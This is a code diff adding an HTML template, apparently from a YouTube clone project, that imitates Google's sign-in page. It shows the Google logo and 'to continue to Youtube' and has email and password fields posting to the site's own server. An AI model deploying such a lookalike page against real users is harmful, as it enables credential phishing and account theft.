@@ -1,0 +1,36 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="/static/gform.css">
+    <script src="https://code.iconify.design/iconify-icon/1.0.7/iconify-icon.min.js"></script>
+</head>
+<body>
+
+    <section>
+    <form class="form" method="post"> 
+        <img class="google" src="/static/pictures/google-logo.png" alt="">
+
+        <h3>Sign  in</h3>
+        <p>to continue to Youtube</p>
+        <input  type="text" name="name" placeholder="Email or phone">
+        <br><br>
+        <input  type="password" name="password" placeholder="Password">
+        <h5 class="blue">Forgot password?</h5>
+        <p>Not your computer? Use Guest mode to sign in privately.</p>
+        <h5 class="blue">Learn more</h5>
+        <div class="account    flex-div">
+        <a href="{{url_for('adduser')}}"><h5 class="blue">Create an account</h5></a>
+        <input class="button" type="submit" value="next">
+        </div>
+        
+    </form>
+
+    <div class="footer flex-div">
+        <p>‪English (United States)‬</p>
+        <p>help privacy States</p>
+    </div>
+    </section>
+</body>
+</html>
